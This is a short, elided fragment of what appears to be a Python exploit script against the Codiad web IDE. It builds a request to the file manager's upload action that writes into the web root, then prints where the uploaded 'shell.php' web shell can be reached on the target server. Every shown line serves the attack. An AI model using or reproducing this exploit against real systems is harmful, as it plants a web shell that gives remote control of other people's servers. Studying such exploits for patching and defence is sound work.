...
link_exploit = link_base + 'components/filemanager/controller.php?action=upload&path=/var/www/html/codiad/' + projectname
print('')
...
print('File uploaded except you got an error message before. If so please run this program again and correct your',
      'mistakes!')
print('')
print('Path of file on the server: http://' + target_ip + ':' + target_port + codiadpath + projectname + '/' + 'shell.php')
print('')
